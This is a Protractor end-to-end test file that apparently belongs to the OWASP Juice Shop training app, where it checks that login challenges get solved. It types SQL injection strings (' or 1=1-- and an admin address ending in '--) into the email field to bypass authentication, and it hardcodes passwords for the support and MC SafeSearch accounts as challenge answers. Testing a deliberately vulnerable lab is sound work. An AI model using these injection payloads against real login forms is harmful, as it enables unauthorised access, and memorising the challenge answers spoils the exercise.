const config = require('config')
const otplib = require('otplib')

describe('/#/login', () => {
  let email, password, rememberMeCheckbox, loginButton

  beforeEach(() => {
    browser.get('/#/login')
    email = element(by.id('email'))
    password = element(by.id('password'))
    rememberMeCheckbox = element(by.id('rememberMe-input'))
    loginButton = element(by.id('loginButton'))
  })

  describe('challenge "loginAdmin"', () => {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
      email.sendKeys('\' or 1=1--')
      password.sendKeys('a')
      loginButton.click()
    })

    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
      email.sendKeys('admin@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Admin' })
  })


  describe('challenge "loginSupport"', () => {
    it('should be able to log in with original support-team credentials', () => {
      email.sendKeys('support@' + config.get('application.domain'))
      password.sendKeys('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
      loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Support Team' })
  })

  describe('challenge "loginRapper"', () => {
    it('should be able to log in with original MC SafeSearch credentials', () => {
      email.sendKeys('mc.safesearch@' + config.get('application.domain'))
      password.sendKeys('Mr. N00dles')
      loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login MC SafeSearch' })
  })




})
